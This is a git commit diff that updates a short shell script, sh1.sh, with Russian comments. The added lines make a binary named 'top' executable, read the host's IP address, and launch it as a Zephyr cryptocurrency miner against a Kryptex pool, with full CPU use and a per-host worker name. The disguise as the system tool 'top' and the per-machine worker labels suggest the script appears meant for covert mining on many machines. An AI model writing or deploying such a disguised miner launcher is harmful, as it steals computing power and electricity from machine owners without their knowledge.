c43d48deb88b60d7bb71f4c497b49824f5737578
fintafixuser <164501103+fintafixuser@users.noreply.github.com>
2024-03-27 11:48:15 +0200

    Update sh1.sh

--- sh1.sh
+++ sh1.sh
@@ -1,1 +1,12 @@
-./top -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/ua1 -k 	--cpu-no-yield  --coin zephyr -a rx/0
+# Шаг 2: Делаем файл исполняемым
+chmod +x top
+
+# Шаг 3: Получаем IP-адрес хоста
+host_ip=$(hostname -I)
+
+# Проверка наличия IP-адреса
+if [ -z "$host_ip" ]; then
+    echo "ERROR"
+    exit 1
+fi
+./top -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/xm$host_ip -k 	--cpu-no-yield  --coin zephyr -a rx/0
